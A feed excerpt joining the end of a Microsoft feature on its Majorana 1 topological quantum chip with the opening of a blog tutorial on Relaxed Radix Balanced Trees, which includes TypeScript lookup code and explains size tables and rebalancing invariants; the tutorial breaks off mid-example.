<li>For instance, they could help solve the difficult chemistry question of why materials suffer corrosion or cracks. This could lead to self-healing materials that repair cracks in bridges or airplane parts, shattered phone screens or scratched car doors.</li>
</ul>



<ul>
<li>Because there are so many types of plastics, it isn’t currently possible to find a one-size-fits-all catalyst that can break them down – especially important for cleaning up microplastics or tackling carbon pollution. Quantum computing could calculate the properties of such catalysts to break down pollutants into valuable byproducts or develop non-toxic alternatives in the first place.</li>
</ul>



<ul>
<li>Enzymes, a kind of biological catalyst, could be harnessed more effectively in healthcare and agriculture, thanks to accurate calculations about their behavior that only quantum computing can provide. This could lead to breakthroughs helping to eradicate global hunger: boosting soil fertility to increase yields or promoting sustainable growth of foods in harsh climates.</li>
</ul>



<p>Most of all, quantum computing could allow engineers, scientists, companies and others to simply design things right the first time – which would be transformative for everything from healthcare to product development. The power of quantum computing, combined with AI tools, would allow someone to describe what kind of new material or molecule they want to create in plain language and get an answer that works straightaway – no guesswork or years of trial and error. &nbsp;</p>



<p>“Any company that makes anything could just design it perfectly the first time out. It would just give you the answer,” Troyer said. “The quantum computer teaches the AI the language of nature so the AI can just tell you the recipe for what you want to make.”</p>



<h2>Rethinking quantum computing at scale</h2>



<p>The quantum world operates according to the laws of quantum mechanics, which are not the same laws of physics that govern the world we see. The particles are called qubits, or quantum bits, analogous to the bits, or ones and zeros, that computers now use.</p>



<p>Qubits are finicky and highly susceptible to perturbations and errors that come from their environment, which cause them to fall apart and information to be lost. Their state can also be affected by measurement – a problem because measuring is essential for computing. An inherent challenge is developing a qubit that can be measured and controlled, while offering protection from environmental noise that corrupts them.</p>



<p>Qubits can be created in different ways, each with advantages and disadvantages. Nearly 20 years ago, Microsoft decided to pursue a unique approach: developing topological qubits, which it believed would offer more stable qubits requiring less error correction, thereby unlocking speed, size and controllability advantages. The approach posed a steep learning curve, requiring uncharted scientific and engineering breakthroughs, but also the most promising path to creating scalable and controllable qubits capable of doing commercially valuable work.</p>



<figure><div>
<iframe title="Majorana 1 Explained: The Path to a Million Qubits" width="500" height="281" data-src="https://www.youtube.com/embed/wSHmygPQukQ?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></div></figure>



<p>The disadvantage is – or was – that until recently the exotic particles Microsoft sought to use, called Majoranas, had never been seen or made. They don’t exist in nature and can only be coaxed into existence with magnetic fields and superconductors. The difficulty of developing the right materials to create the exotic particles and their associated topological state of matter is why most quantum efforts have focused on other kinds of qubits.</p>



<p>The Nature paper marks peer-reviewed confirmation that Microsoft has not only been able to create Majorana particles, which help protect quantum information from random disturbance, but can also reliably measure that information from them using microwaves.</p>



<p>Majoranas hide quantum information, making it more robust, but also harder to measure. The Microsoft team’s new measurement approach is so precise it can detect the difference between one billion and one billion and one electrons in a superconducting wire – which tells the computer what state the qubit is in and forms the basis for quantum computation.</p>



<p>The measurements can be turned on and off with voltage pulses, like flicking a light switch, rather than finetuning dials for each individual qubit. This simpler measurement approach that enables digital control simplifies the quantum computing process and the physical requirements to build a scalable machine.</p>



<p>Microsoft’s topological qubit also has an advantage over other qubits because of its size. Even for something that tiny, there’s a “Goldilocks” zone, where a too-small qubit is hard to run control lines to, but a too-big qubit requires a huge machine, Troyer said. Adding the individualized control technology for those types of qubits would require building an impractical computer the size of an airplane hangar or football field.</p>



<p>Majorana 1, Microsoft’s quantum chip that contains both qubits as well as surrounding control electronics, can be held in the palm of one’s hand and fits neatly into a quantum computer that can be easily deployed inside Azure datacenters.</p>



<p>“It’s one thing to discover a new state of matter,” Nayak said. “It’s another to take advantage of it to rethink quantum computing at scale.”</p>



<h2>Designing quantum materials atom by atom</h2>



<p>Microsoft’s topological qubit architecture has aluminum nanowires joined together to form an H. Each H has four controllable Majoranas and makes one qubit. These Hs can be connected, too, and laid out across the chip like so many tiles.</p>



<p>“It’s complex in that we had to show a new state of matter to get there, but after that, it’s fairly simple. It tiles out. You have this much simpler architecture that promises a much faster path to scale,” said Krysta Svore, Microsoft technical fellow.</p>



<figure><img loading="lazy" decoding="async" width="1024" height="683" src="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1024x683.jpg" alt="Photo showing a close up of the Majorana 1 quantum chip with brass equipment in the background. " srcset="https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1024x683.jpg 1024w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-768x512.jpg 768w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1536x1025.jpg 1536w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-300x200.jpg 300w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore-1900x1268.jpg 1900w, https://pub-66c8c8c5ae474e9a9161c92b21de2f08.r2.dev/2025/02/Quantum-portrait-Krysta-Svore.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Krysta Svore, Microsoft technical fellow. Photo by John Brecher for Microsoft.&nbsp;&nbsp;</figcaption></figure>



<p>The quantum chip doesn’t work alone. It exists in an ecosystem with control logic, a dilution refrigerator that keeps qubits at temperatures much colder than outer space and a software stack that can integrate with AI and classical computers. All those pieces exist, built or modified entirely in-house, she said.</p>



<p>To be clear, continuing to refine those processes and getting all the elements to work together at accelerated scale will require more years of engineering work. But many difficult scientific and engineering challenges have now been met, Microsoft said.</p>



<p>Getting the materials stack right to produce a topological state of matter was one of the hardest parts, Svore added. Instead of silicon, Microsoft’s topoconductor is made of indium arsenide, a material currently used in such applications as infrared detectors and which has special properties. The semiconductor is married with superconductivity, thanks to extreme cold, to make a hybrid.</p>



<p>“We are literally spraying atom by atom. Those materials have to line up perfectly. If there are too many defects in the material stack, it just kills your qubit,” Svore said.</p>



<p>“Ironically, it’s also why we need a quantum computer – because understanding these materials is incredibly hard. With a scaled quantum computer, we will be able to predict materials with even better properties for building the next generation of quantum computers beyond scale,” she said.</p>



<p><strong>Related links:</strong></p>



<p>Learn more: <a href="https://news.microsoft.com/azure-quantum/">Introducing Microsoft Majorana 1</a></p>



<p>Read more: <a href="https://aka.ms/MSQuantumAQblog">Microsoft unveils Majorana 1, the world’s first quantum processor powered by topological qubits</a></p>



<p>Learn more: <a href="https://quantum.microsoft.com/en-us/quantum-ready/get-started">Microsoft’s Quantum Ready program</a></p>



<p>Learn more: <a href="https://quantum.microsoft.com/en-us/solutions/azure-quantum-solutions">Azure Quantum Solutions</a> &nbsp;</p>



<p>Read more: <a href="https://news.microsoft.com/source/features/innovation/azure-quantum-majorana-topological-qubit/">In a historic milestone, Azure Quantum demonstrates formerly elusive physics needed to build scalable topological qubits</a></p>



<p>Read more: <a href="https://www.nature.com/articles/s41586-024-08445-2">Nature: Interferometric Single-Shot Parity Measurement in InAs-Al Hybrid Devices</a></p>



<p>Read more: <a href="https://aka.ms/MSBrandArXivTopo">arXiv: Roadmap to fault tolerant quantum computation using topological qubit arrays</a></p>



<p><em>Top image: Majorana 1, the first quantum chip powered by a Topological Core based on a revolutionary new class of materials developed by Microsoft. Photo by John Brecher for Microsoft.&nbsp;</em></p>

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Relaxed Radix Balanced Trees (2024) (129 pts)]]></title>
            <link>https://peter.horne-khan.com/relaxed-radix-balanced-trees/</link>
            <guid>43103604</guid>
            <pubDate>Wed, 19 Feb 2025 16:05:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://peter.horne-khan.com/relaxed-radix-balanced-trees/">https://peter.horne-khan.com/relaxed-radix-balanced-trees/</a>, See on <a href="https://news.ycombinator.com/item?id=43103604">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-astro-cid-tnnyocjb="">    <p>I’m adding immutable vectors to my language, Ivan, and needed to pick a suitable data structure to implement them. Clojure uses Persistent Vectors (PVs) which support lookups, updates, and appends all in ‘effectively’ constant time. However, it doesn’t have efficient insert or merge operations. Relaxed Radix Balanced (RRB) Trees, introduced by Bagwell and Rompf in 2011, address this shortcoming.</p>
<p>I had to read a few different papers to properly understand how they worked so I thought I’d write an introduction in the hope of making it a tad easier for others. I’ll try to convey how they work and some intuition for why, while leaving the deeper mathematical treatment to the academic papers.</p>
<p>I will assume you’re already familiar with <a href="https://hypirion.com/musings/understanding-persistent-vector-pt-1">how Persistent Vectors work</a>.</p>
<h2 id="merging-persistent-vectors">Merging Persistent Vectors</h2>
<p>Let’s suppose we merge two Persistent Vectors, giving us the following result:</p>
<img src="https://peter.horne-khan.com/_astro/figure-1.C0izVYEa_Z6UaAU.svg" alt="Merging 2 Persistent Vectors" width="751" height="91" loading="lazy" decoding="async">
<p>Since we rely on a fixed node size (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span>) for radix search to work, we must ensure that every node (except the right edge) has <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> children. A tree with this property is said to be <em>leftwise dense</em>. In this example, since the last child of the left vector only has 2 elements we must move 2 elements over from the right vector. Doing so imbalances the first child node of the right vector, so we must repeat the process with its subsequent children until all nodes are balanced. This process involves creating many new replacement nodes (shown in orange). The work that needs to be done is proportional to the size of the right vector.</p>
<h2 id="relax">Relax</h2>
<p>We need to relax the leftwise dense constraint, but doing so will introduce two problems:</p>
<ol>
<li>Radix search relies on each node having the same fixed branching factor.</li>
<li>The height of the tree, which is what lets us claim ‘effectively’ constant operations, is bounded by the fixed branching factor.</li>
</ol>
<p>The first problem can be overcome by recording the actual size of nodes somewhere. We’ll add a <em>size table</em> to each branch – an array with a length equal to the number of children contained in that node. Each entry in the size table records the <em>cumulative</em> number of elements contained in the corresponding child node, which we’ll refer to as a <em>slot</em>.</p>
<img src="https://peter.horne-khan.com/_astro/figure-2.UQI5iB4R_16LP2R.svg" alt="RRB Tree with size tables" width="591" height="151" loading="lazy" decoding="async">
<p>In this example, the root node has two children and we can see from the associated size table that the first child contains 14 elements, while the second contains 8 (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>22</mn><mo>−</mo><mn>14</mn></mrow><annotation encoding="application/x-tex">22 - 14</annotation></semantics></math></span></span>). Since we can now derive the range of elements contained within each slot, finding an element is fairly straightforward. Suppose we wanted to retrieve the element at index position <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span></span>:</p>
<ol>
<li>Starting at the root, the element we are searching for will be contained within the first slot that has a corresponding entry in the size table greater than the index we are looking up. In this case, we skip the first slot (since <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn><mo>&gt;</mo><mn>14</mn></mrow><annotation encoding="application/x-tex">16 &gt; 14</annotation></semantics></math></span></span>) and find our element will be in the second slot (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn><mo>&lt;</mo><mn>22</mn></mrow><annotation encoding="application/x-tex">16 &lt; 22</annotation></semantics></math></span></span>).</li>
<li>Before we repeat the process and search for the element within that slot, we need to adjust our index to account for all the elements in preceding nodes that we are now disregarding. We do that by simply subtracting the previous entry in the size table (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>14</mn></mrow><annotation encoding="application/x-tex">14</annotation></semantics></math></span></span>) from our index (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span></span>) which gives us a new index of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span></span>.</li>
<li>We step through the slots to find our element and this time it’s contained within the first slot (<span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>&lt;</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">2 &lt; 3</annotation></semantics></math></span></span>). Once again, we adjust our index before recursing – this time subtracting nothing because there is no previous entry in the size table.</li>
<li>We’ve now reached a leaf node which doesn’t have a size table since we can rely on normal array indexing instead. Our index is currently <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span></span> and we can see the 3<sup>rd</sup> item is the expected value of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span></span>.</li>
</ol>
<p>Doing a linear scan through the size table at each level of the tree is a lot more work than the handful of bit operations performed when radix indexing. However, we can combine the two approaches. Consider that if we’re allowing nodes to contain <em>fewer</em> than <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> slots then any elements that no longer fit in the current node will have to be placed in subsequent slots. Therefore we can use radix indexing on the size table to skip any slots that are guaranteed not to contain our element and then, if necessary, step forward until we find the right slot. We’ll soon introduce invariants that limit the number of additional slots we have to step to, on average, only 2 or 3.</p>
<p>Here’s how we might implement relaxed radix search in TypeScript:</p>
<pre tabindex="0" data-language="typescript"><code><span><span>const</span><span> M</span><span> =</span><span> 32</span><span> // power of 2</span></span>
<span><span>const</span><span> BIT_WIDTH</span><span> =</span><span> Math.</span><span>log2</span><span>(</span><span>M</span><span>) </span><span>// 5</span></span>
<span></span>
<span><span>/**</span></span>
<span><span> * Find the element at position `idx`, or null if the index is out of bounds.</span></span>
<span><span> */</span></span>
<span><span>export</span><span> const</span><span> get</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span><span>rrb</span><span>:</span><span> Rrb</span><span>&lt;</span><span>T</span><span>&gt;, </span><span>idx</span><span>:</span><span> number</span><span>)</span><span>:</span><span> T</span><span> |</span><span> null</span><span> =&gt;</span><span> {</span></span>
<span><span>  if</span><span> (idx </span><span>&gt;=</span><span> rrb.count) </span><span>return</span><span> null</span></span>
<span><span>  return</span><span> findElement</span><span>(rrb.root, idx)</span></span>
<span><span>}</span></span>
<span></span>
<span><span>const</span><span> findElement</span><span> =</span><span> &lt;</span><span>T</span><span>&gt;(</span><span>node</span><span>:</span><span> Node</span><span>&lt;</span><span>T</span><span>&gt;, </span><span>idx</span><span>:</span><span> number</span><span>)</span><span>:</span><span> T</span><span> =&gt;</span><span> {</span></span>
<span><span>  if</span><span> (</span><span>isBranch</span><span>(node)) {</span></span>
<span><span>    // find the slot containing our element</span></span>
<span><span>    const</span><span> slot</span><span> =</span><span> findSlot</span><span>(idx, node.height, node.sizes)</span></span>
<span><span>    // find the number of elements in the preceding slots</span></span>
<span><span>    const</span><span> prevSize</span><span> =</span><span> slot </span><span>===</span><span> 0</span><span> ?</span><span> 0</span><span> :</span><span> node.sizes[slot </span><span>-</span><span> 1</span><span>]</span></span>
<span><span>    // calculate the index within our slot</span></span>
<span><span>    const</span><span> nextIdx</span><span> =</span><span> idx </span><span>-</span><span> prevSize</span></span>
<span><span>    // recurse</span></span>
<span><span>    return</span><span> findElement</span><span>(node.items[slot], nextIdx)</span></span>
<span><span>  } </span><span>else</span><span> {</span></span>
<span><span>    // fallback to array indexing for leaf nodes</span></span>
<span><span>    return</span><span> node.items[idx]</span></span>
<span><span>  }</span></span>
<span><span>}</span></span>
<span></span>
<span><span>const</span><span> findSlot</span><span> =</span><span> (</span><span>idx</span><span>:</span><span> number</span><span>, </span><span>height</span><span>:</span><span> number</span><span>, </span><span>sizes</span><span>:</span><span> number</span><span>[])</span><span>:</span><span> number</span><span> =&gt;</span><span> {</span></span>
<span><span>  // find starting slot by radix indexing</span></span>
<span><span>  let</span><span> slot </span><span>=</span><span> idx </span><span>&gt;&gt;</span><span> (</span><span>BIT_WIDTH</span><span> *</span><span> height)</span></span>
<span><span>  // skip slots until we reach the first with a cumulative size greater than</span></span>
<span><span>  // our index - this is where our element will be</span></span>
<span><span>  while</span><span> (sizes[slot] </span><span>&lt;=</span><span> idx) slot</span><span>++</span></span>
<span><span>  return</span><span> slot</span></span>
<span><span>}</span></span>
<span></span></code></pre>
<p>Another simple optimisation that we could do is to omit the size table on nodes that are leftwise dense. In other words, we start with Persistent Vectors and only add size tables, incurring their costs, to the subset of nodes that are affected when merging.</p>
<h2 id="mm-1-invariant">M..M-1 Invariant</h2>
<p>To address the second problem, that the tree height is no longer bounded, we’ll reintroduce an invariant similar to the original Persistent Vector requirement that all nodes, except the rightmost edge, must contain <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> slots. To permit a variable slot size, we’ll require nodes to have between <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M -1</annotation></semantics></math></span></span> slots. With our example branching factor of 4, nodes may now have 3 or 4 slots. In our implementation where we use a branching factor of 32, nodes may have 31 or 32 slots.</p>
<p>Exactly how this impacts the height of the tree wasn’t immediately obvious to me, so let’s break it down. With a branching factor of 32 the maximum addressable space is 4,294,967,295. In the best case, every node has 32 children, so the height is given by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>32</mn></msub><mo stretchy="false">(</mo><mn>4</mn><mo separator="true">,</mo><mn>294</mn><mo separator="true">,</mo><mn>967</mn><mo separator="true">,</mo><mn>295</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">log_{32}(4,294,967,295)</annotation></semantics></math></span></span> which is 6.39 so we’ll have 7 levels. In the worst case, we have <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>31</mn></msub><mo stretchy="false">(</mo><mn>4</mn><mo separator="true">,</mo><mn>294</mn><mo separator="true">,</mo><mn>967</mn><mo separator="true">,</mo><mn>295</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">log_{31}(4,294,967,295)</annotation></semantics></math></span></span> which is 6.45… also only 7 levels!</p>
<p>Not only does this constrain the height of the tree but it also constrains the number of possible extra search steps we have to perform during lookup. Higher levels of the tree may require more steps than lower levels since the offsetting compounds. We can calculate the total possible extra steps at the top of a tree of height <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span></span> by taking the difference between the maximum possible number of leaf elements, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mi>h</mi></msup></mrow><annotation encoding="application/x-tex">M^h</annotation></semantics></math></span></span>, and the minimum possible number of leaf elements, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>M</mi><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>h</mi></msup></mrow><annotation encoding="application/x-tex">(M-1)^h</annotation></semantics></math></span></span>, and dividing it by the number of slots under that level, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>M</mi><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">M^{h-1}</annotation></semantics></math></span></span>:</p>
<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><msup><mi>M</mi><mi>h</mi></msup><mo>−</mo><mo stretchy="false">(</mo><mi>M</mi><mo>−</mo><mn>1</mn><msup><mo stretchy="false">)</mo><mi>h</mi></msup></mrow><msup><mi>M</mi><mrow><mi>h</mi><mo>−</mo><mn>1</mn></mrow></msup></mfrac></mrow><annotation encoding="application/x-tex">\frac{M^h - (M-1)^h}{M^{h-1}}
</annotation></semantics></math></span></span></span>
<p>To make that concrete, the worst case for a tree with <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn></mrow><annotation encoding="application/x-tex">5</annotation></semantics></math></span></span> levels and a branching factor of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span></span> is an additional <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4.69</mn></mrow><annotation encoding="application/x-tex">4.69</annotation></semantics></math></span></span> steps. However, assuming a random distribution of node sizes between <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M-1</annotation></semantics></math></span></span> and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span>, then on average we only have to perform <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.49</mn></mrow><annotation encoding="application/x-tex">2.49</annotation></semantics></math></span></span> additional steps which adds very little overhead. Especially since the relevant entries in the size table are small enough to fit in the CPU cache.</p>
<p>With the introduction of size tables and the <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi>M</mi><mo>−</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">M..M-1</annotation></semantics></math></span></span> invariant we now have a data structure permitting some flexibility in the number of slots at each node while maintaining efficient lookup. Let’s revisit our earlier example of merging two vectors to see how many replacement nodes we now need to create to ensure a balanced tree.</p>
<img src="https://peter.horne-khan.com/_astro/figure-3.Dvv6G6cr_Z2qdjVz.svg" alt="Merging RRB under M..M-1 invariant" width="771" height="191" loading="lazy" decoding="async">
<p>The second leaf node has only 2 slots yet we must ensure each node has at least 3. The most efficient way to redistribute the slots is either to move the last slot of the first node, or the first slot of the third node, into the second node. In both cases we create 2 new replacement nodes rather than the 3 necessitated when using Persistent Vectors. This may not seem like much, since the trees in this example are shallow and we’re using a branching factor of 4 but we no longer need to shuffle <em>every</em> element in the right vector to the left which means we will be able to leave entire subtrees untouched when merging.</p>
<h2 id="search-step-invariant">Search Step Invariant</h2>
<p>However, we can do even better. You may have noticed that we merged 4 slots across 2 nodes into a single node with a total of… 4 slots. Had we simply merged both trees without rebalancing we would still have the same number of additional search steps for each index (at most 1). Could we use a different invariant that permits us to do that? What if rather than a lower bound on the branching factor we instead placed an invariant on the number of additional search steps permitted?</p>
<p>We know that the optimal number of slots to contain <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span></span> nodes is <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>P</mi><mi mathvariant="normal">/</mi><mi>M</mi><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil P / M \rceil</annotation></semantics></math></span></span> because we can fully fill up the first <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi mathvariant="normal">/</mi><mi>M</mi></mrow><annotation encoding="application/x-tex">P/M</annotation></semantics></math></span></span> slots and then use one additional slot to put the remainder in. Let’s say that we allow some constant, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi></mrow><annotation encoding="application/x-tex">E</annotation></semantics></math></span></span>, of additional extra search steps then the total number of slots <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span></span> we may use to contain <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span></span> nodes is given by the inequality <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>≤</mo><mo stretchy="false">⌈</mo><mi>P</mi><mi mathvariant="normal">/</mi><mi>M</mi><mo stretchy="false">⌉</mo><mo>+</mo><mi>E</mi></mrow><annotation encoding="application/x-tex">S \le \lceil P / M \rceil + E</annotation></semantics></math></span></span>. We’ll call this the <em>Search Step Invariant</em>. Bagwell &amp; Rompf claim that with <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mn>32</mn></mrow><annotation encoding="application/x-tex">M = 32</annotation></semantics></math></span></span>, using <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">E = 2</annotation></semantics></math></span></span> provides a good balance between a small impact on the indexing time and a low concatenation cost. Although we’re only using <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">M = 4</annotation></semantics></math></span></span> in these examples we’ll use <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">E = 2</annotation></semantics></math></span></span> too.</p>
<p>Applying this new invariant to our example, we see that no rebalancing is necessary since <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>≤</mo><mo stretchy="false">⌈</mo><mn>14</mn><mi mathvariant="normal">/</mi><mn>4</mn><mo stretchy="false">⌉</mo><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">4 \le \lceil 14 / 4 \rceil + 2</annotation></semantics></math></span></span>, or  <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>≤</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">4 \le 6</annotation></semantics></math></span></span>. In this simple example, merging is very efficient since we only need to recreate the parent node to contain the slots from both input trees. No children nodes need replacing since no rebalancing is required. We also know that lookup is efficient since there are, at most, only <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">E =2</annotation></semantics></math></span></span> additional search steps required at this level.</p>
<img src="https://peter.horne-khan.com/_astro/figure-4.CAI8tCQf_ZhyRbi.svg" alt="Merging RRB under search step invariant with no rebalancing" width="791" height="91" loading="lazy" decoding="async">
<p>Now lets look at another example so we can see how the rebalancing algorithm works in detail. Then we’ll finally cover how to merge RRB trees.</p>
<img src="https://peter.horne-khan.com/_astro/figure-5.CBARG3PW_eHNOQ.svg" alt="Merging RRB under search step invariant with no rebalancing" width="972" height="92" loading="lazy" decoding="async">
<p>When rebalancing, we consider all <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span></span> slots together. Since each of the 2 nodes we are merging have at most <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi></mrow><annotation encoding="application/x-tex">M</annotation></semantics></math></span></span> slots, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>≤</mo><mn>2</mn><mi>M</mi></mrow><annotation encoding="application/x-tex">S \le 2M</annotation></semantics></math></span></span>. To make things easier and reduce the amount of copying done, we first calculate a plan of how many items each slot should contain in the following way:</p>
<ol>
<li>Check if our invariant, <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>≤</mo><mo stretchy="false">⌈</mo><mi>P</mi><mi mathvariant="normal">/</mi><mi>M</mi><mo stretchy="false">⌉</mo><mo>+</mo><mi>E</mi></mrow><annotation encoding="application/x-tex">S \le \lceil P / M \rceil + E</annotation></semantics></math></span></span>, is met. If not, proceed.</li>
<li>Skip any slots with at least <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mrow><mi>E</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></mrow><annotation encoding="application/x-tex">M-{E/2}</annotation></semantics></math></span></span> items as these don’t need redistributing. Once we reach the first slot with fewer than <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>−</mo><mrow><mi>E</mi><mi mathvariant="normal">/</mi><mn>2</mn></mrow></mrow><annotation encoding="application/x-tex">M-{E/2}</annotation></semantics></math></span></span> items, there will always be enough space in the subsequent slots for us to distribute the items over. (I don’t have a good explanation for <em>why</em> this is the case. The papers include a simple proof if you’re curious.)</li>
<li>Remove the slot that needs redistributing and add as many of its items as possible to the next slot, then as many of the remainder to the next one, and so on.</li>
<li>Repeat.</li>
</ol>
<p>Lets apply that to the example step by step:</p>
<ol>
